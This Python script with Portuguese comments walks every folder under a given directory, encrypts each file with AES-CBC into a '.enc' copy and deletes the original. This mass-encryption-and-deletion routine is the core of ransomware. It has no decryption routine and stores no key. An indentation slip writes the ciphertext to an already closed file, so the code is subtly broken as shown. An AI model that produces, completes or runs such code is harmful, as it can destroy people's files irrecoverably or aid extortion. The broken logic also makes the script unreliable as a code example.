import os
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from tqdm import tqdm

def encrypt_file(file_path, key):
    """Criptografa o arquivo com a chave fornecida e salva o arquivo criptografado."""
    try:
        cipher = AES.new(key, AES.MODE_CBC)

        with open(file_path, "rb") as f:
            data = f.read()

        encrypted_data = cipher.encrypt(pad(data, AES.block_size))

        encrypted_file_path = file_path + ".enc"
        with open(encrypted_file_path, "wb") as f:
            f.write(cipher.iv)
        f.write(encrypted_data)

        print(f"Cryptograf: {encrypted_file_path}")
        os.remove(file_path)
        return encrypted_file_path

    except Exception as e:
        print(f"\nError: {e}")
        return

def scan_and_encrypt(directory, key):
    """Escaneia o diretório e criptografa os arquivos"""
    files_to_encrypt = []
    for root, _, files in os.walk(directory):
        for file in files:
            if not file.endswith('.enc'):
                files_to_encrypt.append(os.path.join(root, file))   

    for file_path in tqdm(files_to_encrypt, desc="Criptografando arquivos", unit="arquivo"):
        os.system('cls' if os.name == 'nt' else 'clear')
        encrypt_file(file_path, key)
        time.sleep(0.1)
